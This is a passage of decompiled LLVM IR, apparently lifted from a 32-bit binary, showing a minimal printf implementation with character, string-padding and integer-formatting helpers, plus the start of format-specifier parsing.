  %v1_80483d0 = add i32 %v2_80483c5, 1
  %v3_80483e2 = inttoptr i32 %arg1 to i8*
  %v4_80483e2 = call i32 @util_memcpy(i8* %v3_80483e2, i32 %arg2, i32 %v1_80483d0)
  %v2_80483ea = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80483ea, i32* @ebp, align 4
  ret i32 %v2_80483c5

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_8 = alloca i8, align 1
  %tmp8 = trunc i32 %arg2 to i8
  store i8 %tmp8, i8* %stack_var_8, align 1
  %v4_80483f2 = icmp eq i32* %arg1, null
  br i1 %v4_80483f2, label %dec_label_pc_8048411, label %dec_label_pc_80483f8

dec_label_pc_80483f8:                             ; preds = %entry
  %tmp5 = ptrtoint i32* %arg1 to i32
  %v2_80483fb = load i32, i32* %arg1, align 4
  %v3_8048400 = inttoptr i32 %v2_80483fb to i8*
  store i8 %tmp8, i8* %v3_8048400, align 1
  %v2_8048405 = load i32, i32* %arg1, align 4
  %v1_8048407 = add i32 %v2_8048405, 1
  store i32 %v1_8048407, i32* %arg1, align 4
  br label %dec_label_pc_804842c

dec_label_pc_8048411:                             ; preds = %entry
  %v3_8048427 = bitcast i8* %stack_var_8 to i32*
  %v4_8048427 = call i32 @__libc_write(i32 1, i32* %v3_8048427, i32 1)
  br label %dec_label_pc_804842c

dec_label_pc_804842c:                             ; preds = %dec_label_pc_80483f8, %dec_label_pc_8048411
  %v0_804842d = phi i32 [ %tmp5, %dec_label_pc_80483f8 ], [ %v4_8048427, %dec_label_pc_8048411 ]
  ret i32 %v0_804842d

; uselistorder directives
  uselistorder i32* %arg1, { 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_804842c, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp13 = icmp slt i32 %arg3, 1
  br i1 %tmp13, label %dec_label_pc_804848f, label %dec_label_pc_8048448

dec_label_pc_8048448:                             ; preds = %entry
  %v4_804844f = ptrtoint i8* %arg2 to i32
  %v2_804846045 = load i8, i8* %arg2, align 1
  %v4_804846347 = icmp eq i8 %v2_804846045, 0
  %v1_804846549 = icmp eq i1 %v4_804846347, false
  br i1 %v1_804846549, label %dec_label_pc_8048457, label %dec_label_pc_8048467

dec_label_pc_8048457:                             ; preds = %dec_label_pc_8048448, %dec_label_pc_8048457
  %v4_804845d51 = phi i32 [ %v5_804845a, %dec_label_pc_8048457 ], [ %v4_804844f, %dec_label_pc_8048448 ]
  %stack_var_-12.050 = phi i32 [ %v4_8048457, %dec_label_pc_8048457 ], [ 0, %dec_label_pc_8048448 ]
  %v4_8048457 = add i32 %stack_var_-12.050, 1
  %v5_804845a = add i32 %v4_804845d51, 1
  %v22_804845a = inttoptr i32 %v5_804845a to i8*
  %v2_8048460 = load i8, i8* %v22_804845a, align 1
  %v4_8048463 = icmp eq i8 %v2_8048460, 0
  %v1_8048465 = icmp eq i1 %v4_8048463, false
  br i1 %v1_8048465, label %dec_label_pc_8048457, label %dec_label_pc_8048467

dec_label_pc_8048467:                             ; preds = %dec_label_pc_8048457, %dec_label_pc_8048448
  %stack_var_-12.0.lcssa = phi i32 [ 0, %dec_label_pc_8048448 ], [ %v4_8048457, %dec_label_pc_8048457 ]
  %v5_804846d = icmp slt i32 %stack_var_-12.0.lcssa, %arg3
  br i1 %v5_804846d, label %dec_label_pc_8048478, label %dec_label_pc_804847e

dec_label_pc_8048478:                             ; preds = %dec_label_pc_8048467
  %v5_804847b = sub i32 %arg3, %stack_var_-12.0.lcssa
  br label %dec_label_pc_804847e

dec_label_pc_804847e:                             ; preds = %dec_label_pc_8048467, %dec_label_pc_8048478
  %storemerge = phi i32 [ %v5_804847b, %dec_label_pc_8048478 ], [ 0, %dec_label_pc_8048467 ]
  %v1_8048481 = and i32 %arg4, 2
  %tmp14 = mul nuw nsw i32 %v1_8048481, 8
  %tmp15 = or i32 %tmp14, 32
  br label %dec_label_pc_804848f

dec_label_pc_804848f:                             ; preds = %dec_label_pc_804847e, %entry
  %stack_var_12.0 = phi i32 [ %arg3, %entry ], [ %storemerge, %dec_label_pc_804847e ]
  %stack_var_-16.0 = phi i32 [ 32, %entry ], [ %tmp15, %dec_label_pc_804847e ]
  %v1_8048492 = urem i32 %arg4, 2
  %v2_8048492 = icmp eq i32 %v1_8048492, 0
  %v1_8048497 = icmp eq i1 %v2_8048492, false
  %.pre = inttoptr i32 %arg1 to i32*
  br i1 %v1_8048497, label %dec_label_pc_80484d9.preheader, label %dec_label_pc_80484b3.preheader

dec_label_pc_80484b3.preheader:                   ; preds = %dec_label_pc_804848f
  %tmp1638 = icmp slt i32 %stack_var_12.0, 1
  %tmp1739 = icmp eq i1 %tmp1638, false
  br i1 %tmp1739, label %dec_label_pc_804849b, label %dec_label_pc_80484d9.preheader

dec_label_pc_804849b:                             ; preds = %dec_label_pc_80484b3.preheader, %dec_label_pc_804849b
  %stack_var_-20.041 = phi i32 [ %v4_80484ad, %dec_label_pc_804849b ], [ 0, %dec_label_pc_80484b3.preheader ]
  %stack_var_12.140 = phi i32 [ %v4_80484b0, %dec_label_pc_804849b ], [ %stack_var_12.0, %dec_label_pc_80484b3.preheader ]
  %v3_80484a8 = call i32 @printchar(i32* %.pre, i32 %stack_var_-16.0)
  %v4_80484ad = add i32 %stack_var_-20.041, 1
  %v4_80484b0 = add i32 %stack_var_12.140, -1
  %tmp16 = icmp slt i32 %v4_80484b0, 1
  %tmp17 = icmp eq i1 %tmp16, false
  br i1 %tmp17, label %dec_label_pc_804849b, label %dec_label_pc_80484d9.preheader

dec_label_pc_80484d9.preheader:                   ; preds = %dec_label_pc_80484b3.preheader, %dec_label_pc_804849b, %dec_label_pc_804848f
  %stack_var_12.2.ph = phi i32 [ %stack_var_12.0, %dec_label_pc_804848f ], [ %stack_var_12.0, %dec_label_pc_80484b3.preheader ], [ %v4_80484b0, %dec_label_pc_804849b ]
  %stack_var_-20.1.ph = phi i32 [ 0, %dec_label_pc_804848f ], [ 0, %dec_label_pc_80484b3.preheader ], [ %v4_80484ad, %dec_label_pc_804849b ]
  %v4_80484d926 = ptrtoint i8* %arg2 to i32
  %v2_80484dc27 = load i8, i8* %arg2, align 1
  %v4_80484df29 = icmp eq i8 %v2_80484dc27, 0
  %v1_80484e131 = icmp eq i1 %v4_80484df29, false
  br i1 %v1_80484e131, label %dec_label_pc_80484bb, label %dec_label_pc_80484fd.preheader

dec_label_pc_80484bb:                             ; preds = %dec_label_pc_80484d9.preheader, %dec_label_pc_80484bb
  %v4_80484d934 = phi i32 [ %v5_80484d6, %dec_label_pc_80484bb ], [ %v4_80484d926, %dec_label_pc_80484d9.preheader ]
  %stack_var_-20.133 = phi i32 [ %v4_80484d3, %dec_label_pc_80484bb ], [ %stack_var_-20.1.ph, %dec_label_pc_80484d9.preheader ]
  %stack_var_8.032 = phi i8* [ %v22_80484d6, %dec_label_pc_80484bb ], [ %arg2, %dec_label_pc_80484d9.preheader ]
  %v2_80484be = load i8, i8* %stack_var_8.032, align 1
  %v3_80484be = zext i8 %v2_80484be to i32
  %v3_80484ce = call i32 @printchar(i32* %.pre, i32 %v3_80484be)
  %v4_80484d3 = add i32 %stack_var_-20.133, 1
  %v5_80484d6 = add i32 %v4_80484d934, 1
  %v22_80484d6 = inttoptr i32 %v5_80484d6 to i8*
  %v2_80484dc = load i8, i8* %v22_80484d6, align 1
  %v4_80484df = icmp eq i8 %v2_80484dc, 0
  %v1_80484e1 = icmp eq i1 %v4_80484df, false
  br i1 %v1_80484e1, label %dec_label_pc_80484bb, label %dec_label_pc_80484fd.preheader

dec_label_pc_80484fd.preheader:                   ; preds = %dec_label_pc_80484bb, %dec_label_pc_80484d9.preheader
  %stack_var_-20.1.lcssa = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_80484d9.preheader ], [ %v4_80484d3, %dec_label_pc_80484bb ]
  %tmp1822 = icmp slt i32 %stack_var_12.2.ph, 1
  %tmp1923 = icmp eq i1 %tmp1822, false
  br i1 %tmp1923, label %dec_label_pc_80484e5, label %dec_label_pc_8048503

dec_label_pc_80484e5:                             ; preds = %dec_label_pc_80484fd.preheader, %dec_label_pc_80484e5
  %stack_var_-20.225 = phi i32 [ %v4_80484f7, %dec_label_pc_80484e5 ], [ %stack_var_-20.1.lcssa, %dec_label_pc_80484fd.preheader ]
  %stack_var_12.324 = phi i32 [ %v4_80484fa, %dec_label_pc_80484e5 ], [ %stack_var_12.2.ph, %dec_label_pc_80484fd.preheader ]
  %v3_80484f2 = call i32 @printchar(i32* %.pre, i32 %stack_var_-16.0)
  %v4_80484f7 = add i32 %stack_var_-20.225, 1
  %v4_80484fa = add i32 %stack_var_12.324, -1
  %tmp18 = icmp slt i32 %v4_80484fa, 1
  %tmp19 = icmp eq i1 %tmp18, false
  br i1 %tmp19, label %dec_label_pc_80484e5, label %dec_label_pc_8048503

dec_label_pc_8048503:                             ; preds = %dec_label_pc_80484e5, %dec_label_pc_80484fd.preheader
  %stack_var_-20.2.lcssa = phi i32 [ %stack_var_-20.1.lcssa, %dec_label_pc_80484fd.preheader ], [ %v4_80484f7, %dec_label_pc_80484e5 ]
  ret i32 %stack_var_-20.2.lcssa

; uselistorder directives
  uselistorder i32 %v4_80484fa, { 1, 0 }
  uselistorder i8* %v22_80484d6, { 1, 0 }
  uselistorder i32 %v5_80484d6, { 1, 0 }
  uselistorder i32 %v4_80484b0, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %stack_var_-12.0.lcssa, { 1, 0 }
  uselistorder i32 %v5_804845a, { 1, 0 }
  uselistorder i32 %arg3, { 3, 1, 2, 0 }
  uselistorder i8* %arg2, { 0, 2, 3, 1, 4 }
  uselistorder label %dec_label_pc_80484e5, { 1, 0 }
  uselistorder label %dec_label_pc_80484bb, { 1, 0 }
  uselistorder label %dec_label_pc_80484d9.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804849b, { 1, 0 }
  uselistorder label %dec_label_pc_804847e, { 1, 0 }
  uselistorder label %dec_label_pc_8048457, { 1, 0 }
}

define i32 @printi(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-5 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v4_804851c = trunc i64 %arg2 to i32
  %v5_8048522 = icmp eq i32 %v4_804851c, 0
  %v6_8048522 = icmp slt i32 %v4_804851c, 0
  %v1_8048526 = icmp eq i1 %v5_8048522, false
  br i1 %v1_8048526, label %dec_label_pc_8048558, label %dec_label_pc_8048528

dec_label_pc_8048528:                             ; preds = %entry
  store i32 48, i32* %stack_var_-16, align 4
  %tmp42 = bitcast i32* %stack_var_-16 to i8*
  %v6_804854b = call i32 @prints(i32 %arg1, i8* %tmp42, i32 %arg5, i32 %arg6)
  br label %dec_label_pc_8048642

dec_label_pc_8048558:                             ; preds = %entry
  %v4_8048558 = icmp eq i32 %arg4, 0
  br i1 %v4_8048558, label %dec_label_pc_8048579, label %dec_label_pc_804855e

dec_label_pc_804855e:                             ; preds = %dec_label_pc_8048558
  %v13_804855e = icmp eq i32 %arg3, 10
  %v1_8048562 = icmp eq i1 %v13_804855e, false
  br i1 %v1_8048562, label %dec_label_pc_8048579, label %dec_label_pc_8048564

dec_label_pc_8048564:                             ; preds = %dec_label_pc_804855e
  %v1_8048568 = icmp eq i1 %v6_8048522, false
  br i1 %v1_8048568, label %dec_label_pc_8048579, label %dec_label_pc_804856a

dec_label_pc_804856a:                             ; preds = %dec_label_pc_8048564
  %v1_8048574 = sub i32 0, %v4_804851c
  %v5_8048576 = sext i32 %v1_8048574 to i64
  br label %dec_label_pc_8048579

dec_label_pc_8048579:                             ; preds = %dec_label_pc_8048564, %dec_label_pc_804855e, %dec_label_pc_8048558, %dec_label_pc_804856a
  %stack_var_-24.0 = phi i64 [ %arg2, %dec_label_pc_8048558 ], [ %arg2, %dec_label_pc_804855e ], [ %arg2, %dec_label_pc_8048564 ], [ %v5_8048576, %dec_label_pc_804856a ]
  %stack_var_-32.0 = phi i32 [ 0, %dec_label_pc_8048558 ], [ 0, %dec_label_pc_804855e ], [ 0, %dec_label_pc_8048564 ], [ 1, %dec_label_pc_804856a ]
  %tmp43 = bitcast i32* %stack_var_-5 to i8*
  store i8 0, i8* %tmp43, align 4
  %v4_80485da8 = trunc i64 %stack_var_-24.0 to i32
  %v5_80485da9 = icmp eq i32 %v4_80485da8, 0
  %v1_80485de16 = icmp eq i1 %v5_80485da9, false
  br i1 %v1_80485de16, label %dec_label_pc_804858a.lr.ph, label %dec_label_pc_80485e0

dec_label_pc_804858a.lr.ph:                       ; preds = %dec_label_pc_8048579
  %v5_804858d = sext i32 %arg3 to i64
  br label %dec_label_pc_804858a

dec_label_pc_804858a:                             ; preds = %dec_label_pc_804858a.lr.ph, %dec_label_pc_80485b2
  %stack_var_-24.118 = phi i64 [ %stack_var_-24.0, %dec_label_pc_804858a.lr.ph ], [ %v5_80485d7, %dec_label_pc_80485b2 ]
  %stack_var_-40.017 = phi i8* [ %tmp43, %dec_label_pc_804858a.lr.ph ], [ %v22_80485b2, %dec_label_pc_80485b2 ]
  %v6_8048598 = and i64 %stack_var_-24.118, 4294967295
  %v12_8048598 = udiv i64 %v6_8048598, %v5_804858d
  %v13_8048598 = trunc i64 %v12_8048598 to i32
  %v14_8048598 = urem i64 %v6_8048598, %v5_804858d
  %v5_804859d = trunc i64 %v14_8048598 to i8
  %v7_80485a4 = icmp sgt i8 %v5_804859d, 9
  br i1 %v7_80485a4, label %dec_label_pc_80485a6, label %dec_label_pc_80485b2

dec_label_pc_80485a6:                             ; preds = %dec_label_pc_804858a
  %tmp = trunc i64 %v14_8048598 to i32
  %v5_80485a9 = add i32 %tmp, %arg7
  %v1_80485ac = add i32 %v5_80485a9, 198
  %v11_80485ac = trunc i32 %v1_80485ac to i8
  br label %dec_label_pc_80485b2

dec_label_pc_80485b2:                             ; preds = %dec_label_pc_804858a, %dec_label_pc_80485a6
  %stack_var_-36.0 = phi i8 [ %v11_80485ac, %dec_label_pc_80485a6 ], [ %v5_804859d, %dec_label_pc_804858a ]
  %v4_80485b2 = ptrtoint i8* %stack_var_-40.017 to i32
  %v5_80485b2 = add i32 %v4_80485b2, -1
  %v22_80485b2 = inttoptr i32 %v5_80485b2 to i8*
  %v2_80485b9 = add i8 %stack_var_-36.0, 48
  store i8 %v2_80485b9, i8* %v22_80485b2, align 1
  %v5_80485d7 = sext i32 %v13_8048598 to i64
  %v5_80485da = icmp eq i32 %v13_8048598, 0
  %v1_80485de = icmp eq i1 %v5_80485da, false
  br i1 %v1_80485de, label %dec_label_pc_804858a, label %dec_label_pc_80485e0

dec_label_pc_80485e0:                             ; preds = %dec_label_pc_80485b2, %dec_label_pc_8048579
  %stack_var_-40.0.lcssa = phi i8* [ %tmp43, %dec_label_pc_8048579 ], [ %v22_80485b2, %dec_label_pc_80485b2 ]
  %v4_80485e0 = icmp eq i32 %stack_var_-32.0, 0
  br i1 %v4_80485e0, label %dec_label_pc_804861a, label %dec_label_pc_80485e6

dec_label_pc_80485e6:                             ; preds = %dec_label_pc_80485e0
  %v4_80485e6 = icmp eq i32 %arg5, 0
  br i1 %v4_80485e6, label %dec_label_pc_8048611, label %dec_label_pc_80485ec

dec_label_pc_80485ec:                             ; preds = %dec_label_pc_80485e6
  %v1_80485ef = and i32 %arg6, 2
  %v2_80485ef = icmp eq i32 %v1_80485ef, 0
  br i1 %v2_80485ef, label %dec_label_pc_8048611, label %dec_label_pc_80485f6

dec_label_pc_80485f6:                             ; preds = %dec_label_pc_80485ec
  %v3_8048604 = inttoptr i32 %arg1 to i32*
  %v4_8048604 = call i32 @printchar(i32* %v3_8048604, i32 45)
  %v4_804860c = add i32 %arg5, -1
  br label %dec_label_pc_804861a

dec_label_pc_8048611:                             ; preds = %dec_label_pc_80485ec, %dec_label_pc_80485e6
  %v4_8048611 = ptrtoint i8* %stack_var_-40.0.lcssa to i32
  %v5_8048611 = add i32 %v4_8048611, -1
  %v22_8048611 = inttoptr i32 %v5_8048611 to i8*
  store i8 45, i8* %v22_8048611, align 1
  br label %dec_label_pc_804861a

dec_label_pc_804861a:                             ; preds = %dec_label_pc_80485e0, %dec_label_pc_80485f6, %dec_label_pc_8048611
  %stack_var_20.0 = phi i32 [ %arg5, %dec_label_pc_80485e0 ], [ %arg5, %dec_label_pc_8048611 ], [ %v4_804860c, %dec_label_pc_80485f6 ]
  %stack_var_-40.1 = phi i8* [ %stack_var_-40.0.lcssa, %dec_label_pc_80485e0 ], [ %v22_8048611, %dec_label_pc_8048611 ], [ %stack_var_-40.0.lcssa, %dec_label_pc_80485f6 ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_80485e0 ], [ 0, %dec_label_pc_8048611 ], [ 1, %dec_label_pc_80485f6 ]
  %v6_8048635 = call i32 @prints(i32 %arg1, i8* %stack_var_-40.1, i32 %stack_var_20.0, i32 %arg6)
  %v2_804863d = add i32 %v6_8048635, %stack_var_-28.0
  br label %dec_label_pc_8048642

dec_label_pc_8048642:                             ; preds = %dec_label_pc_8048528, %dec_label_pc_804861a
  %storemerge = phi i32 [ %v2_804863d, %dec_label_pc_804861a ], [ %v6_804854b, %dec_label_pc_8048528 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %stack_var_-40.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v22_80485b2, { 0, 2, 1 }
  uselistorder i8 %v5_804859d, { 1, 0 }
  uselistorder i64 %v6_8048598, { 1, 0 }
  uselistorder i32 %arg6, { 1, 2, 0 }
  uselistorder i32 %arg5, { 2, 4, 1, 3, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i64 %arg2, { 2, 1, 0, 3 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048642, { 1, 0 }
  uselistorder label %dec_label_pc_804861a, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80485b2, { 1, 0 }
  uselistorder label %dec_label_pc_804858a, { 1, 0 }
  uselistorder label %dec_label_pc_8048579, { 3, 0, 1, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp6 = ptrtoint i32* %arg1 to i32
  %stack_var_-6 = alloca i32, align 4
  %tmp21 = bitcast i32* %stack_var_-6 to i8*
  %stack_var_8.449 = inttoptr i32 %arg2 to i8*
  %v2_80488fb50 = load i8, i8* %stack_var_8.449, align 1
  %v4_80488fe52 = icmp eq i8 %v2_80488fb50, 0
  %v1_804890054 = icmp eq i1 %v4_80488fe52, false
  br i1 %v1_804890054, label %dec_label_pc_8048659, label %dec_label_pc_8048906

dec_label_pc_8048659:                             ; preds = %entry, %dec_label_pc_80488f5
  %stack_var_8.458 = phi i8* [ %stack_var_8.4, %dec_label_pc_80488f5 ], [ %stack_var_8.449, %entry ]
  %stack_var_-28.157 = phi i32 [ %stack_var_-28.0, %dec_label_pc_80488f5 ], [ 0, %entry ]
  %stack_var_12.156 = phi i32 [ %stack_var_12.0, %dec_label_pc_80488f5 ], [ %arg3, %entry ]
  %stack_var_8.4.in55 = phi i32 [ %v5_80488f5, %dec_label_pc_80488f5 ], [ %arg2, %entry ]
  %v2_804865c = load i8, i8* %stack_var_8.458, align 1
  %v10_804865f = icmp eq i8 %v2_804865c, 37
  %v1_8048661 = icmp eq i1 %v10_804865f, false
  br i1 %v1_8048661, label %dec_label_pc_80488da, label %dec_label_pc_8048667

dec_label_pc_8048667:                             ; preds = %dec_label_pc_8048659
  %v5_8048667 = add i32 %stack_var_8.4.in55, 1
  %v22_8048667 = inttoptr i32 %v5_8048667 to i8*
  %v2_804867a = load i8, i8* %v22_8048667, align 1
  %v4_804867d = icmp eq i8 %v2_804867a, 0
  br i1 %v4_804867d, label %dec_label_pc_8048906, label %dec_label_pc_8048685

dec_label_pc_8048685:                             ; preds = %dec_label_pc_8048667
  %v2_8048688 = load i8, i8* %v22_8048667, align 1
  %v10_804868b = icmp eq i8 %v2_8048688, 37
  br i1 %v10_804868b, label %dec_label_pc_80488da, label %dec_label_pc_8048693

dec_label_pc_8048693:                             ; preds = %dec_label_pc_8048685
  %v2_8048696 = load i8, i8* %v22_8048667, align 1
  %v10_8048699 = icmp eq i8 %v2_8048696, 45
  %v1_804869b = icmp eq i1 %v10_8048699, false
  br i1 %v1_804869b, label %dec_label_pc_80486b0.preheader, label %dec_label_pc_804869d

dec_label_pc_804869d:                             ; preds = %dec_label_pc_8048693
  %v5_804869d = add i32 %stack_var_8.4.in55, 2
  %v22_804869d = inttoptr i32 %v5_804869d to i8*
  br label %dec_label_pc_80486b0.preheader

dec_label_pc_80486b0.preheader:                   ; preds = %dec_label_pc_804869d, %dec_label_pc_8048693
  %stack_var_8.0.ph = phi i8* [ %v22_8048667, %dec_label_pc_8048693 ], [ %v22_804869d, %dec_label_pc_804869d ]
  %stack_var_-32.0.ph = phi i32 [ 0, %dec_label_pc_8048693 ], [ 1, %dec_label_pc_804869d ]
  %v4_80486b022 = ptrtoint i8* %stack_var_8.0.ph to i32
  %v2_80486b323 = load i8, i8* %stack_var_8.0.ph, align 1
  %v7_80486b627 = icmp eq i8 %v2_80486b323, 48
  br i1 %v7_80486b627, label %dec_label_pc_80486a9, label %dec_label_pc_80486df.preheader

dec_label_pc_80486a9:                             ; preds = %dec_label_pc_80486b0.preheader, %dec_label_pc_80486a9
  %v4_80486b030 = phi i32 [ %v5_80486a9, %dec_label_pc_80486a9 ], [ %v4_80486b022, %dec_label_pc_80486b0.preheader ]
  %stack_var_-32.029 = phi i32 [ %v4_80486ac, %dec_label_pc_80486a9 ], [ %stack_var_-32.0.ph, %dec_label_pc_80486b0.preheader ]
  %v5_80486a9 = add i32 %v4_80486b030, 1
  %v22_80486a9 = inttoptr i32 %v5_80486a9 to i8*
  %v4_80486ac = or i32 %stack_var_-32.029, 2
  %v2_80486b3 = load i8, i8* %v22_80486a9, align 1
  %v7_80486b6 = icmp eq i8 %v2_80486b3, 48
  br i1 %v7_80486b6, label %dec_label_pc_80486a9, label %dec_label_pc_80486df.preheader

dec_label_pc_80486df.preheader:                   ; preds = %dec_label_pc_80486a9, %dec_label_pc_80486b0.preheader
  %stack_var_8.0.lcssa = phi i8* [ %stack_var_8.0.ph, %dec_label_pc_80486b0.preheader ], [ %v22_80486a9, %dec_label_pc_80486a9 ]
  %stack_var_-32.0.lcssa = phi i32 [ %stack_var_-32.0.ph, %dec_label_pc_80486b0.preheader ], [ %v4_80486ac, %dec_label_pc_80486a9 ]
  %v4_80486df32 = ptrtoint i8* %stack_var_8.0.lcssa to i32
  %v2_80486e233 = load i8, i8* %stack_var_8.0.lcssa, align 1
  %tmp = icmp ult i8 %v2_80486e233, 48
  br i1 %tmp, label %dec_label_pc_80486f3, label %dec_label_pc_80486e9

dec_label_pc_80486bc:                             ; preds = %dec_label_pc_80486e9
  %v2_80486c5 = mul i32 %stack_var_-36.041, 10
  %v2_80486cd = load i8, i8* %stack_var_8.140, align 1
  %v3_80486cd = zext i8 %v2_80486cd to i32
  %v5_80486d3 = add i32 %v3_80486cd, %v2_80486c5
  %v1_80486d6 = add i32 %v5_80486d3, -48
  %v5_80486dc = add i32 %v4_80486df42, 1
  %v22_80486dc = inttoptr i32 %v5_80486dc to i8*
  %v2_80486e2 = load i8, i8* %v22_80486dc, align 1
  %tmp65 = icmp ult i8 %v2_80486e2, 48
  br i1 %tmp65, label %dec_label_pc_80486f3, label %dec_label_pc_80486e9

dec_label_pc_80486e9:                             ; preds = %dec_label_pc_80486df.preheader, %dec_label_pc_80486bc
  %v4_80486df42 = phi i32 [ %v5_80486dc, %dec_label_pc_80486bc ], [ %v4_80486df32, %dec_label_pc_80486df.preheader ]
  %stack_var_-36.041 = phi i32 [ %v1_80486d6, %dec_label_pc_80486bc ], [ 0, %dec_label_pc_80486df.preheader ]
  %stack_var_8.140 = phi i8* [ %v22_80486dc, %dec_label_pc_80486bc ], [ %stack_var_8.0.lcssa, %dec_label_pc_80486df.preheader ]
  %v2_80486ec = load i8, i8* %stack_var_8.140, align 1
  %tmp66 = icmp ult i8 %v2_80486ec, 58
  br i1 %tmp66, label %dec_label_pc_80486bc, label %dec_label_pc_80486f3

dec_label_pc_80486f3:                             ; preds = %dec_label_pc_80486bc, %dec_label_pc_80486e9, %dec_label_pc_80486df.preheader
  %stack_var_8.1.lcssa = phi i8* [ %stack_var_8.0.lcssa, %dec_label_pc_80486df.preheader ], [ %stack_var_8.140, %dec_label_pc_80486e9 ], [ %v22_80486dc, %dec_label_pc_80486bc ]
  %stack_var_-36.0.lcssa = phi i32 [ 0, %dec_label_pc_80486df.preheader ], [ %stack_var_-36.041, %dec_label_pc_80486e9 ], [ %v1_80486d6, %dec_label_pc_80486bc ]
  %v2_80486f6 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v10_80486f9 = icmp eq i8 %v2_80486f6, 115
  %v1_80486fb = icmp eq i1 %v10_80486f9, false
  br i1 %v1_80486fb, label %dec_label_pc_804874a, label %dec_label_pc_80486fd

dec_label_pc_80486fd:                             ; preds = %dec_label_pc_80486f3
  %v1_8048700 = add i32 %stack_var_12.156, 4
  %v1_8048708 = inttoptr i32 %stack_var_12.156 to i32*
  %v2_8048708 = load i32, i32* %v1_8048708, align 4
  %v4_804870d = icmp eq i32 %v2_8048708, 0
  br i1 %v4_804870d, label %dec_label_pc_8048722, label %dec_label_pc_8048713

dec_label_pc_8048713:                             ; preds = %dec_label_pc_80486fd
  %v5_8048716 = inttoptr i32 %v2_8048708 to i8*
  br label %dec_label_pc_8048722

dec_label_pc_8048722:                             ; preds = %dec_label_pc_80486fd, %dec_label_pc_8048713
  %storemerge = phi i8* [ %v5_8048716, %dec_label_pc_8048713 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_804ff4c.12, i32 0, i32 0), %dec_label_pc_80486fd ]
  %v6_804873d = call i32 @prints(i32 %tmp6, i8* %storemerge, i32 %stack_var_-36.0.lcssa, i32 %stack_var_-32.0.lcssa)
  %v5_8048742 = add i32 %v6_804873d, %stack_var_-28.157
  br label %dec_label_pc_80488f5

dec_label_pc_804874a:                             ; preds = %dec_label_pc_80486f3
  %v2_804874d = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v10_8048750 = icmp eq i8 %v2_804874d, 100
  %v1_8048752 = icmp eq i1 %v10_8048750, false
  br i1 %v1_8048752, label %dec_label_pc_804879e, label %dec_label_pc_8048754

dec_label_pc_8048754:                             ; preds = %dec_label_pc_804874a
  %v1_8048757 = add i32 %stack_var_12.156, 4
  %v1_804875f = inttoptr i32 %stack_var_12.156 to i32*
  %v2_804875f = load i32, i32* %v1_804875f, align 4
  %v8_8048791 = sext i32 %v2_804875f to i64
  %v9_8048791 = call i32 @printi(i32 %tmp6, i64 %v8_8048791, i32 10, i32 1, i32 %stack_var_-36.0.lcssa, i32 %stack_var_-32.0.lcssa, i32 97)
  %v5_8048796 = add i32 %v9_8048791, %stack_var_-28.157
  br label %dec_label_pc_80488f5

dec_label_pc_804879e:                             ; preds = %dec_label_pc_804874a
  %v2_80487a1 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v10_80487a4 = icmp eq i8 %v2_80487a1, 120
  %v1_80487a6 = icmp eq i1 %v10_80487a4, false
  br i1 %v1_80487a6, label %dec_label_pc_80487f2, label %dec_label_pc_80487a8

dec_label_pc_80487a8:                             ; preds = %dec_label_pc_804879e
  %v1_80487ab = add i32 %stack_var_12.156, 4
  %v1_80487b3 = inttoptr i32 %stack_var_12.156 to i32*
  %v2_80487b3 = load i32, i32* %v1_80487b3, align 4
  %v8_80487e5 = sext i32 %v2_80487b3 to i64
  %v9_80487e5 = call i32 @printi(i32 %tmp6, i64 %v8_80487e5, i32 16, i32 0, i32 %stack_var_-36.0.lcssa, i32 %stack_var_-32.0.lcssa, i32 97)
  %v5_80487ea = add i32 %v9_80487e5, %stack_var_-28.157
  br label %dec_label_pc_80488f5

dec_label_pc_80487f2:                             ; preds = %dec_label_pc_804879e
  %v2_80487f5 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v10_80487f8 = icmp eq i8 %v2_80487f5, 88
  %v1_80487fa = icmp eq i1 %v10_80487f8, false
  br i1 %v1_80487fa, label %dec_label_pc_8048846, label %dec_label_pc_80487fc

dec_label_pc_80487fc:                             ; preds = %dec_label_pc_80487f2
  %v1_80487ff = add i32 %stack_var_12.156, 4
  %v1_8048807 = inttoptr i32 %stack_var_12.156 to i32*
  %v2_8048807 = load i32, i32* %v1_8048807, align 4
  %v8_8048839 = sext i32 %v2_8048807 to i64
  %v9_8048839 = call i32 @printi(i32 %tmp6, i64 %v8_8048839, i32 16, i32 0, i32 %stack_var_-36.0.lcssa, i32 %stack_var_-32.0.lcssa, i32 65)
  %v5_804883e = add i32 %v9_8048839, %stack_var_-28.157
  br label %dec_label_pc_80488f5

dec_label_pc_8048846:                             ; preds = %dec_label_pc_80487f2
  %v2_8048849 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v10_804884c = icmp eq i8 %v2_8048849, 117
  %v1_804884e = icmp eq i1 %v10_804884c, false
  br i1 %v1_804884e, label %dec_label_pc_8048897, label %dec_label_pc_8048850

dec_label_pc_8048850:                             ; preds = %dec_label_pc_8048846
  %v1_8048853 = add i32 %stack_var_12.156, 4
  %v1_804885b = inttoptr i32 %stack_var_12.156 to i32*
